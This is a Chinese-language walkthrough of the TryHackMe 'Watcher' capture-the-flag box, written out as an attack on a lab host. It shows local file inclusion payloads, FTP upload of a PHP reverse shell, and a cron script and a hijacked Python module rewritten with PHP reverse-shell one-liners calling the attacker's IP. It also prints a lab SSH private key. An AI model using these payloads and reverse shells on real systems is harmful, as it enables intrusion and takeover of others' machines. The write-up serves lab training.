# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务发现
```
┌──(root💀kali)-[~/Watcher]
└─# nmap -sV -Pn 10.10.208.80     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 05:55 EDT
Nmap scan report for 10.10.208.80
Host is up (0.30s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds
```

开启了ftp，ssh,http服务，FTP不可以匿名登录

# 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.208.80        

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-10-21_05-55-52.log

Target: http://10.10.208.80

[05:55:52] Starting: 
[05:55:54] 301 -  313B  - /images  ->  http://10.10.208.80/images/
[05:56:00] 200 -    5KB - /                 
[05:56:00] 301 -  310B  - /css  ->  http://10.10.208.80/css/
[06:01:21] 403 -  277B  - /server-status                                                                            
                                                                                                                                                                                                
Task Completed
```

好像没有什么有趣的文件夹

```/robots.txt```显示两个文件
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt

```

找到flag1，另外一个文件web上没有读权限


点开首页，随便点击一个产品页，发现url的格式为：```/post.php?post=striped.php```，看post参数是传入一个本地文件的名字。在想会不会存在本地文件读取漏洞

尝试payload:```/post.php?post=/etc/passwd```成功返回：
```
  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```

由上面可以知道存在：
>ssh用户名：will,mat和toby
>ftp用户名：ftpuser

用文件包含漏洞读取上面没有读权限的文件```secret_file_do_not_read.txt```,payload为：```/post.php?post=/var/www/html/secret_file_do_not_read.txt```,显示下面内容：
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
```

现在我们有了ftp的凭证，登录ftp
```
┌──(root💀kali)-[~/tryhackme/watcher]
└─# ftp 10.10.208.80 
Connected to 10.10.208.80.
220 (vsFTPd 3.0.3)
Name (10.10.208.80:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```

拿到flag2。files文件夹没有内容,但是可以上传文件。

思路：LFI+文件上传，触发反弹shell

所以ftp的路径是什么？

我们尝试读取ftp的配置文件，playload为：```/post.php?post=/etc/vsftpd.conf```,显示：
```
  listen=NO
listen_ipv6=YES
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
chroot_local_user=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
force_dot_files=YES
pasv_min_port=40000
pasv_max_port=50000
user_sub_token=$USER
local_root=/home/$USER/ftp
```

可以看到ftp的默认目录是：```/home/$USER/ftp```,也就是```/home/ftpuser/ftp/```下

这个时候可以写一个test.php看看能不能打印出php的输出，如果可以，证明可以执行我们的php代码，这部分不再演示。

我们上ftp上传一个反弹shell

```
┌──(root💀kali)-[~/tryhackme]
└─# ftp 10.10.208.80
Connected to 10.10.208.80.
220 (vsFTPd 3.0.3)
Name (10.10.208.80:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put /root/tryhackme/reverse_shell.php ./files/shell.php
local: /root/tryhackme/reverse_shell.php remote: ./files/shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5491 bytes sent in 0.00 secs (45.5359 MB/s)
ftp> ls ./files/
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         5491 Oct 22 09:16 shell.php
-rw-r--r--    1 1001     1001           28 Oct 22 08:36 test.php
226 Directory send OK.
ftp> 
```

本地另起一个端口开启监听

LFI访问上传文件，触发反弹shell
```
┌──(root💀kali)-[~/tryhackme]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.208.80] 32980
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:18:31 up  2:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data

```

全局查找flag3，在```/var/www/html/more_secrets_a9f10a/flag_3.txt```找到

flag4在```toby```目录下，没有直接的读权限

运行sudo -l，本账号可以用toby的身份使用任何命令

```
$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

使用```sudo -u toby cat flag_4.txt```拿到flag4


```/home/toby/note.txt```提示文字：
```
$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat

```

查看当前目录下的cron jobs文件

```
$ ls
cow.sh
$ cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
$ ls -alh
total 12K
drwxrwxr-x 2 toby toby 4.0K Dec  3  2020 .
drwxr-xr-x 6 toby toby 4.0K Dec 12  2020 ..
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh

```

查看该任务的执行时间，显示是一分钟一次
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh

```

这里我卡了一会，主要是怎么把shell写进定时任务，用echo和mv命令好像都不行

最后我是这样写进去的，首先执行：```sudo -u toby vim cow.sh```

进去vim以后ggdG清理所有代码，然后把下面的playload复制进去

```
#!/bin/bash
php -r '$sock=fsockopen("10.13.21.169",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

另外起一个端口开启监听，拿到mat的反弹shell:
```
┌──(root💀kali)-[~/tryhackme/watcher]
└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.208.80] 41952
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
$ whoami
mat

```

在mat的目录下拿到flag5

查看mat的sudo权限，可以用will的身份执行一个py脚本
```
$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

我们查看这个脚本的内容和权限：
```
$ cat /home/mat/scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
$ ls -alh /home/mat/scripts/will_script.py
-rw-r--r-- 1 will will 208 Dec  3  2020 /home/mat/scripts/will_script.py
```

查看```script```里面的文件，我们发现cmd.py用mat用户是可以编辑的，也就是说只要我们改写这个文件获得一个反弹shell就可以横向提权到will的账号

修改```cmd.py```为：
```
import os
cmd = """php -r '$sock=fsockopen("10.13.21.169",4243);exec("/bin/sh -i <&3 >&3 2>&3");'"""
os.system(cmd)

```

开启另一个端口监听4243

执行下面命令：
```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py ls
```


拿到用户```will```的反弹shell：
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4243                                                                                                                                                                                                                       1 ⨯
listening on [any] 4243 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.208.80] 59666
$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)

```

在will目录下拿到flag6

adm用户组不是一个寻常的用户组，查看```adm```的用户组文件
```
find / -group adm  >/tmp/a.txt

will@watcher:/home/will$ cat /tmp/a.txt
cat /tmp/a.txt
/opt/backups
/opt/backups/key.b64
/var/log/auth.log
/var/log/kern.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/apt/term.log
/var/spool/rsyslog

```


在/opt/backups下找到加密的ssh秘钥文件


```
will@watcher:/usr$ cd /opt/backups
cd /opt/backups
will@watcher:/opt/backups$ ls
ls
key.b64
will@watcher:/opt/backups$ cat key.b64
cat key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

```

base64解密以后是：
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----

```

把上面文字保存到攻击机，用ssh连接以后拿到flag7
```
┌──(root💀kali)-[~/tryhackme/watcher]
└─# ssh -i id_rsa 10.10.208.80        
The authenticity of host '10.10.208.80 (10.10.208.80)' can't be established.
ECDSA key fingerprint is SHA256:vBeZlR+cak5J2WqxAI9JKbnLjRAbdRGnKxuFjLqsfz4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.208.80' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 22 11:14:46 UTC 2021

  System load:  0.0                Processes:             156
  Usage of /:   23.3% of 18.57GB   Users logged in:       0
  Memory usage: 46%                IP address for eth0:   10.10.208.80
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~# cd /root
root@watcher:~# ls
flag_7.txt
root@watcher:~# cat flag_7.txt
FLAG{who_watches_the_watchers}

```